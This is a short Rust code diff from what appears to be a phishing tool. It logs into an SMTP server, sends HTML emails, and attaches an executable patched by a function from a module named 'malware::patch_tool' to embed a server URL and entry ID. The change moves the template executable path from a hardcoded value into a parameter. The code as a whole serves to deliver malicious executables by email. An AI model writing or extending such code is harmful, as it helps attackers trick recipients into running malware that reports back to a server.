@@ -7,10 +7,7 @@ use std::error::Error;
 use std::fs::{self, create_dir_all};
 use std::path::Path;
 use mime_guess::MimeGuess;
-use lettre::message::header::ContentDisposition;
-use lettre::message::SinglePart;
 use crate::malware::patch_tool::replace_url_in_exe_rdata;
-use percent_encoding::{percent_encode, NON_ALPHANUMERIC};
 
 pub fn verify_smtp_credentials(
     smtp_server: &str,
@@ -41,6 +38,7 @@ pub fn send_html_email(
     appendix_name: &str,
     server_url: &str,
     entry_id: &str,
+    template_exe_path: &str,
 ) -> Result<(), Box<dyn Error>> {
     // 验证凭证
     let creds = verify_smtp_credentials(smtp_server, username, password)?;
@@ -74,7 +72,7 @@ pub fn send_html_email(
             )
         }
         false => {
-            add_attachment(html_content, appendix_name, server_url, entry_id)?
+            add_attachment(html_content, appendix_name, server_url, entry_id, template_exe_path)?
 
         }
     };
@@ -107,8 +105,9 @@ fn add_attachment(
     appendix_name: &str,
     server_url: &str,
     entry_id: &str,
+    template_exe_path: &str,
 ) -> Result<MultiPart, Box<dyn Error>> {
-    let template_exe_path: &str = "./libs/appendix.exe";
+    // let template_exe_path: &str = "./appendix.exe";
     let appendix_name = ensure_exe_suffix(appendix_name);
 
     let content = fs::read(template_exe_path)?;
